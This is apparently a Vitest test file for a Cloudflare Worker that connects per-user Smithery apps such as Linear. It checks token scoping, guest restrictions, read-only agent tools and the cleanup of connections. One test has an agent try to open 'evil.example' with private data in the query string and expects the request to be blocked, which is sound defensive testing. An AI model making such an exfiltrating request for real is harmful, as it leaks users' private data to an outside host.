import { env } from "cloudflare:test";
import { afterEach, beforeEach, expect, test } from "vitest";
import schemaSql from "../schema.sql?raw";
import worker from "../src/index.js";
import { appTools, readsOnly, sweepAppConnections, tagsFor } from "../src/smitheryApps.js";
import { agentTools } from "../src/agentTools.js";
import { forgetPolicies } from "../src/policy.js";

// Apps through Smithery Connect (docs/smithery-apps.md). The pretend
// Smithery below enforces what the real one promises for a scoped token: it
// reads and runs only connections whose metadata matches the token's. The
// tests check that we never read or run a connection with the API key, that
// one person's app never answers for another, and that leaving, a guest's
// role or an app taken away ends connections.

const ORG = "team:apps";
const OTHER = "team:elsewhere";
let owner; let mika; let guest;
const pending = [];
const ctx = { waitUntil: (p) => pending.push(p) };
const realFetch = globalThis.fetch;
const KEY = "sk-smithery-test";
let fake;

const call = async (path, token, { method = "GET", body } = {}) => {
  const res = await worker.fetch(new Request(`https://api.example.com${path}`, {
    method, headers: { "content-type": "application/json", ...(token ? { "x-session-token": token } : {}) }, ...(body ? { body: JSON.stringify(body) } : {}),
  }), apiEnv(), ctx);
  while (pending.length) await pending.shift();
  return res;
};
const apiEnv = () => ({ ...env, OPENAI_API_KEY: undefined, SMITHERY_API_KEY: KEY, SMITHERY_NAMESPACE: "honmaru-test" });
const q = `orgId=${encodeURIComponent(ORG)}`;

function smithery() {
  const state = { connections: new Map(), tokens: new Map(), apiKeyReads: [], deletes: [], failDeletes: false, calls: [] };
  const matches = (meta, want) => Object.entries(want).every(([k, v]) => meta?.[k] === v);
  globalThis.fetch = async (input, init = {}) => {
    const u = new URL(typeof input === "string" ? input : input.url);
    if (u.origin !== "https://api.smithery.ai") return realFetch(input, init);
    const auth = String((init.headers || {}).authorization || "").replace(/^Bearer /, "");
    const body = init.body ? JSON.parse(init.body) : null;
    const isKey = auth === KEY;
    const scope = state.tokens.get(auth);
    if (!isKey && !scope) return Response.json({ error: "unauthorized" }, { status: 401 });
    if (u.pathname === "/tokens" && init.method === "POST") {
      if (!isKey) return Response.json({ error: "forbidden" }, { status: 403 });
      const token = `st_${crypto.randomUUID()}`;
      state.tokens.set(token, body.policy[0].metadata);
      return Response.json({ token, expiresAt: new Date(Date.now() + 600000).toISOString() });
    }
    if (u.pathname === "/servers") {
      return Response.json({ servers: [{ qualifiedName: "linear", displayName: "Linear", description: "Issues", verified: true, useCount: 10, remote: true, isDeployed: true, homepage: "https://linear.app", iconUrl: null }], pagination: {} });
    }
    const server = /^\/servers\/(.+)$/.exec(u.pathname);
    if (server) {
      const name = decodeURIComponent(server[1]);
      if (name === "linear") return Response.json({ qualifiedName: "linear", displayName: "Linear", description: "Issues", remote: true, verified: true });
      if (name === "local-only") return Response.json({ qualifiedName: "local-only", displayName: "Local", remote: false });
      return Response.json({ error: "not_found" }, { status: 404 });
    }
    const m = /^\/connect\/([^/]+)\/([^/]+)(\/\.tools(?:\/(.+))?)?$/.exec(u.pathname);
    if (!m) return Response.json({ error: "not_found" }, { status: 404 });
    const id = decodeURIComponent(m[2]);
    const conn = state.connections.get(id);
    // A scoped token sees only connections tagged like it.
    const visible = conn && (isKey || matches(conn.metadata, scope));
    if (init.method === "PUT") {
      if (!isKey) return Response.json({ error: "forbidden" }, { status: 403 });
      const next = conn || { state: "auth_required", secret: null };
      Object.assign(next, { server: body.server, name: body.name, metadata: body.metadata });
      state.connections.set(id, next);
      return Response.json({ connectionId: id, status: next.state === "auth_required" ? { state: "auth_required", setupUrl: `https://auth.smithery.ai/setup/${id}` } : { state: next.state } }, { status: conn ? 200 : 201 });
    }
    if (init.method === "DELETE") {
      if (!isKey) return Response.json({ error: "forbidden" }, { status: 403 });
      if (state.failDeletes) return Response.json({ error: "down" }, { status: 503 });
      state.deletes.push(id);
      state.connections.delete(id);
      return Response.json({ success: true });
    }
    if (isKey) state.apiKeyReads.push(u.pathname);
    if (!visible) return Response.json({ error: "not_found", message: "Connection not found" }, { status: 404 });
    if (!m[3]) return Response.json({ connectionId: id, status: { state: conn.state } });
    if (!m[4]) {
      return Response.json({ tools: [
        { name: "search_issues", description: "Search issues", inputSchema: { type: "object", properties: { query: { type: "string" } } } },
        { name: "create_issue", description: "Create an issue", inputSchema: { type: "object", properties: { title: { type: "string" } } } },
        { name: "archive_everything", description: "Archive", inputSchema: { type: "object" }, annotations: { destructiveHint: true } },
      ] });
    }
    state.calls.push({ id, tool: decodeURIComponent(m[4]), args: body });
    return Response.json({ content: [{ type: "text", text: conn.secret }] });
  };
  return state;
}

beforeEach(async () => {
  await env.DB.exec(schemaSql.replace(/\n/g, " "));
  await env.DB.exec("DELETE FROM rate_limits; DELETE FROM audit_events; DELETE FROM sessions; DELETE FROM memberships; DELETE FROM users; DELETE FROM org_apps; DELETE FROM app_connections; DELETE FROM app_connection_tombstones;");
  forgetPolicies();
  fake = smithery();
  const { createSession, upsertUser, upsertMembership } = await import("../src/db.js");
  for (const [id, login, name, role] of [["9701", "toru", "Toru", "owner"], ["9702", "mika", "Mika", "member"], ["9703", "gina", "Gina", "guest"]]) {
    await upsertUser(env.DB, { githubId: id, login, name, avatarUrl: null, locale: "en" });
    await upsertMembership(env.DB, ORG, id, role);
  }
  await upsertMembership(env.DB, OTHER, "9702", "member");
  owner = await createSession(env.DB, "9701", "a");
  mika = await createSession(env.DB, "9702", "b");
  guest = await createSession(env.DB, "9703", "c");
});
afterEach(() => { globalThis.fetch = realFetch; });

const allow = (body = {}) => call("/orgs/apps", owner, { method: "POST", body: { orgId: ORG, server: "linear", ...body } });
/// Connect, then (as the person would at Smithery's page) finish it, with
/// what their own account holds.
async function connect(token, secret, orgId = ORG) {
  const res = await call("/apps/connect", token, { method: "POST", body: { orgId, server: "linear" } });
  const answer = await res.json();
  if (res.status !== 200) return { res, answer };
  const id = [...fake.connections.keys()].find((k) => fake.connections.get(k).secret === null);
  fake.connections.get(id).state = "connected";
  fake.connections.get(id).secret = secret;
  return { res, answer, id };
}
const sessionOf = async (token) => env.DB.prepare("SELECT * FROM sessions WHERE token = ?1").bind(token).first();

test("none by default; only an owner allows an app, and only one that runs as a service", async () => {
  expect(await (await call(`/orgs/apps?${q}`, mika)).json()).toMatchObject({ configured: true, apps: [], canConnect: true, canManage: false });
  expect((await call("/apps/connect", mika, { method: "POST", body: { orgId: ORG, server: "linear" } })).status).toBe(403);
  expect((await call("/orgs/apps", mika, { method: "POST", body: { orgId: ORG, server: "linear" } })).status).toBe(403);
  expect((await call(`/orgs/apps/registry?${q}&q=linear`, mika)).status).toBe(403);
  const found = await (await call(`/orgs/apps/registry?${q}&q=linear`, owner)).json();
  expect(found.servers[0]).toMatchObject({ server: "linear", verified: true });
  expect((await allow({ server: "local-only" })).status).toBe(400);
  expect((await allow({ server: "nope" })).status).toBe(404);
  expect((await allow()).status).toBe(201);
  const logged = await env.DB.prepare("SELECT severity FROM audit_events WHERE org_id = ?1 AND action = 'apps.allowed'").bind(ORG).first();
  expect(logged.severity).toBe("critical");
});

test("each person's connection is their own: separate tags, and a guest cannot connect", async () => {
  await allow();
  const t = await connect(owner, "TORU-ONLY-DATA");
  expect(t.answer).toMatchObject({ state: "auth_required", setupUrl: expect.stringMatching(/^https:\/\/auth\.smithery\.ai\//) });
  const m = await connect(mika, "MIKA-ONLY-DATA");
  expect(t.id).not.toBe(m.id);
  expect(fake.connections.get(t.id).metadata).toEqual(await tagsFor(ORG, "9701"));
  expect(fake.connections.get(m.id).metadata).toEqual(await tagsFor(ORG, "9702"));
  // Nothing personal leaves in the tags.
  expect(JSON.stringify(fake.connections.get(m.id).metadata)).not.toMatch(/mika|9702|apps/);
  // The same person in another workspace is someone else to Smithery.
  expect(await tagsFor(OTHER, "9702")).not.toEqual(await tagsFor(ORG, "9702"));
  expect((await call("/apps/connect", guest, { method: "POST", body: { orgId: ORG, server: "linear" } })).status).toBe(403);
  // What each sees: their own state, read with their own token.
  const seen = await (await call(`/orgs/apps?${q}`, mika)).json();
  expect(seen.apps[0].connection).toMatchObject({ state: "connected" });
  expect(fake.apiKeyReads).toEqual([]);
  // A route never takes a connection ID; the rows are not handed out.
  expect(JSON.stringify(seen)).not.toContain(m.id);
});

test("an agent reads only the asker's own app, with a token that could not read anyone else's", async () => {
  await allow();
  const t = await connect(owner, "TORU-ONLY-DATA");
  await connect(mika, "MIKA-ONLY-DATA");
  const taint = { value: false };
  const tools = await appTools(apiEnv(), { orgId: ORG, session: await sessionOf(mika), taint });
  expect(Object.keys(tools)).toEqual(["app1_search_issues"]);
  const out = await tools.app1_search_issues.run({ query: "x" });
  expect(out).toContain("MIKA-ONLY-DATA");
  expect(out).not.toContain("TORU-ONLY-DATA");
  expect(taint.value).toBe(true);
  expect(fake.apiKeyReads).toEqual([]);

  // Even a row pointing at someone else's connection (a bug, a bad write)
  // reads nothing: Smithery refuses a token that is not theirs.
  await env.DB.prepare("DELETE FROM app_connections WHERE user_github_id = '9701'").run();
  await env.DB.prepare("UPDATE app_connections SET id = ?1 WHERE user_github_id = '9702'").bind(t.id).run();
  const crossed = await appTools(apiEnv(), { orgId: ORG, session: await sessionOf(mika), taint: { value: false } });
  expect(Object.keys(crossed)).toEqual([]);
  expect(fake.calls.filter((c) => c.id === t.id)).toEqual([]);

  // What was asked and answered is never kept in the audit log.
  const { results } = await env.DB.prepare("SELECT * FROM audit_events WHERE org_id = ?1 AND action = 'apps.tool_called'").bind(ORG).all();
  expect(results.length).toBe(1);
  expect(JSON.stringify(results)).not.toMatch(/MIKA-ONLY-DATA|"x"/);
});

test("only in the person's own conversation, only reading, and no page opened after an app answered", async () => {
  await allow();
  await connect(mika, "MIKA-ONLY-DATA");
  const session = await sessionOf(mika);
  // A channel: no app tools at all.
  const inChannel = await agentTools(apiEnv(), { orgId: ORG, session, personal: false });
  expect(Object.keys(inChannel).filter((n) => n.startsWith("app"))).toEqual([]);
  // Their own conversation: the reading tool, not the writing or destructive one.
  const own = await agentTools(apiEnv(), { orgId: ORG, session, personal: true, ownAgentsOnly: true });
  expect(Object.keys(own).filter((n) => n.startsWith("app"))).toEqual(["app1_search_issues"]);
  await own.app1_search_issues.run({ query: "q" });
  expect(await own.read_url.run({ url: "https://evil.example/?leak=MIKA-ONLY-DATA" })).toMatch(/^Not opened/);
  // Writing, once the owner allows it — and only for the person's own agents.
  await allow({ allowWrites: true });
  const withWrites = await agentTools(apiEnv(), { orgId: ORG, session, personal: true, ownAgentsOnly: true });
  expect(Object.keys(withWrites).filter((n) => n.startsWith("app")).sort()).toEqual(["app1_archive_everything", "app1_create_issue", "app1_search_issues"]);
  const teammatesAgent = await agentTools(apiEnv(), { orgId: ORG, session, personal: true, ownAgentsOnly: false });
  expect(Object.keys(teammatesAgent).filter((n) => n.startsWith("app"))).toEqual(["app1_search_issues"]);
});

test("what counts as reading", () => {
  expect(readsOnly({ name: "search_issues" })).toBe(true);
  expect(readsOnly({ name: "get-page" })).toBe(true);
  expect(readsOnly({ name: "create_issue" })).toBe(false);
  expect(readsOnly({ name: "send_email", annotations: { readOnlyHint: true, destructiveHint: true } })).toBe(false);
  expect(readsOnly({ name: "summarize", annotations: { readOnlyHint: true } })).toBe(true);
  expect(readsOnly({ name: "list_things", annotations: { readOnlyHint: false } })).toBe(false);
});

test("leaving, becoming a guest, or the app taken away ends connections — here and at Smithery", async () => {
  await allow();
  const t = await connect(owner, "T");
  const m = await connect(mika, "M");
  // Removed from the workspace: at once.
  const members = await (await call(`/members?${q}`, owner)).json();
  const mikaRef = (members.members || members).find((x) => x.name === "Mika").ref;
  expect((await call("/members", owner, { method: "DELETE", body: { orgId: ORG, ref: mikaRef } })).status).toBeLessThan(300);
  expect(fake.deletes).toContain(m.id);
  expect(await env.DB.prepare("SELECT COUNT(*) AS n FROM app_connections WHERE user_github_id = '9702'").first()).toEqual({ n: 0 });

  // A connection whose person became a guest, found by the sweep; and one
  // whose deletion at Smithery failed, retried.
  const { upsertMembership } = await import("../src/db.js");
  await upsertMembership(env.DB, ORG, "9702", "member");
  const m2 = await connect(mika, "M2");
  await env.DB.prepare("UPDATE memberships SET role = 'guest' WHERE org_id = ?1 AND user_github_id = '9702'").bind(ORG).run();
  fake.failDeletes = true;
  expect((await sweepAppConnections(apiEnv())).ended).toBe(1);
  expect(await env.DB.prepare("SELECT COUNT(*) AS n FROM app_connections WHERE user_github_id = '9702'").first()).toEqual({ n: 0 });
  expect(fake.connections.has(m2.id)).toBe(true);
  fake.failDeletes = false;
  expect((await sweepAppConnections(apiEnv())).retried).toBe(1);
  expect(fake.connections.has(m2.id)).toBe(false);

  // The app taken away: every connection to it ends.
  expect((await call(`/orgs/apps?${q}&server=linear`, owner, { method: "DELETE" })).status).toBe(200);
  expect(fake.deletes).toContain(t.id);
  expect(await env.DB.prepare("SELECT COUNT(*) AS n FROM app_connections").first()).toEqual({ n: 0 });
});

test("disconnecting your own", async () => {
  await allow();
  const m = await connect(mika, "M");
  expect((await call(`/apps/connect?${q}&server=linear`, mika, { method: "DELETE" })).status).toBe(200);
  expect(fake.deletes).toEqual([m.id]);
  const logged = await env.DB.prepare("SELECT action FROM audit_events WHERE org_id = ?1 AND action LIKE 'apps.%' ORDER BY seq").bind(ORG).all();
  expect(logged.results.map((r) => r.action)).toEqual(["apps.allowed", "apps.connected", "apps.disconnected"]);
});

test("not set up on this deployment: the list says so and nothing connects", async () => {
  const res = await worker.fetch(new Request(`https://api.example.com/orgs/apps?${q}`, { headers: { "x-session-token": mika } }), { ...env, OPENAI_API_KEY: undefined }, ctx);
  expect(await res.json()).toMatchObject({ configured: false, apps: [] });
  const tools = await appTools({ ...env }, { orgId: ORG, session: await sessionOf(mika), taint: { value: false } });
  expect(tools).toEqual({});
});

test("an app may write only when every agent called is the caller's own", async () => {
  const { allOwnAgents } = await import("../src/channelRoutes.js");
  // As listAgents returns them.
  expect(allOwnAgents([{ ownerLogin: "toru" }], "toru")).toBe(true);
  expect(allOwnAgents([{ ownerLogin: "toru" }, { ownerLogin: "mika" }], "toru")).toBe(false);
  expect(allOwnAgents([], "toru")).toBe(false);
  expect(allOwnAgents([{ ownerLogin: "toru" }], null)).toBe(false);
});

